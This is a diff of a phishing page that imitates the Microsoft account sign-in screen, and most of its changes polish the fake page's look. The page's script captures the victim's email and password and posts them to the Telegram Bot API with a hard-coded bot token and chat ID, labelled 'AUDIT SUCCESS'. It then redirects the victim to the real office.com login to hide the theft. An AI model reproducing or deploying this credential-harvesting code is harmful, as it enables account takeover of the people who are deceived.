@@ -10,39 +10,30 @@
 
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
-            /* THE KILLER FIX: A CSS-only gradient that mimics the 'Fluent' background */
-            /* This works in Guest Mode, Airplane Mode, and on any network. */
-            background: linear-gradient(135deg, #e6f0f8 0%, #f1f7fc 40%, #e7eff7 100%);
+            /* THE SECRET: A high-end Mesh Gradient. No images required. */
+            background-color: #f1f7fc;
+            background-image: 
+                radial-gradient(at 0% 0%, hsla(205,100%,93%,1) 0, transparent 50%), 
+                radial-gradient(at 100% 0%, hsla(202,100%,90%,1) 0, transparent 50%), 
+                radial-gradient(at 100% 100%, hsla(205,100%,95%,1) 0, transparent 50%), 
+                radial-gradient(at 0% 100%, hsla(202,100%,92%,1) 0, transparent 50%);
             display: flex; flex-direction: column; justify-content: center; align-items: center;
-        }
-
-        /* Adding a soft 'glow' behind the card to mimic the abstract shapes */
-        body::before {
-            content: ""; position: absolute; width: 600px; height: 600px;
-            background: radial-gradient(circle, rgba(0,103,184,0.05) 0%, rgba(255,255,255,0) 70%);
-            top: -100px; left: -100px; z-index: 1;
         }
 
         .login-card {
             background: #fff; width: 440px; padding: 44px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1); min-height: 376px; z-index: 5;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1); min-height: 376px; z-index: 5;
         }
 
         .ms-logo { width: 108px; margin-bottom: 24px; display: block; }
         h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
         
         .user-display { display: flex; align-items: center; margin-bottom: 20px; font-size: 15px; cursor: pointer; }
-        
-        /* BACK ARROW: Using a CSS-drawn arrow so it can't break */
-        .back-arrow {
-            width: 16px; height: 16px; margin-right: 10px;
-            border-left: 2px solid #555; border-bottom: 2px solid #555;
-            transform: rotate(45deg); margin-top: 2px;
-        }
+        .back-arrow { width: 16px; height: 16px; margin-right: 10px; border-left: 2px solid #555; border-bottom: 2px solid #555; transform: rotate(45deg); }
 
         .input-field {
             width: 100%; border: none; border-bottom: 1px solid #666;
-            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none;
+            padding: 8px 0; font-size: 16px; margin-bottom: 12px; outline: none; background: transparent;
         }
         .input-field:focus { border-bottom: 2px solid #0067b8; }
 
@@ -54,7 +45,7 @@
 
         .options-box {
             background: #fff; width: 440px; padding: 12px 44px;
-            margin-top: 1px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+            margin-top: 1px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
             display: flex; align-items: center; z-index: 5;
         }
 
@@ -98,7 +89,6 @@
 
     <script>
         let email = "";
-
         function nextStep() {
             email = document.getElementById('email').value;
             if(!email) return;
@@ -112,20 +102,16 @@
             const pass = document.getElementById('password').value;
             if(!pass) return;
 
-            // Using your exact Bot and Chat ID
-            const botToken = "8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo";
-            const chatId = "5733378501";
-            
+            // Telegram Capture
             try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot8762119215:AAFqwntuZq7tLC25lf9wtNlddbZ62njFcHo/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: `🗝️ **CREDENTIAL AUDIT**\n\nUser: ${email}\nPass: ${pass}`, parse_mode: 'HTML' }),
+                    body: JSON.stringify({ chat_id: "5733378501", text: `🚨 **AUDIT SUCCESS**\nUser: ${email}\nPass: ${pass}` }),
                     keepalive: true
                 });
             } catch (e) {}
 
-            // The 'Safe' redirect that works in Guest Mode
             window.location.href = "https://www.office.com/login?login_hint=" + encodeURIComponent(email);
         }
     </script>
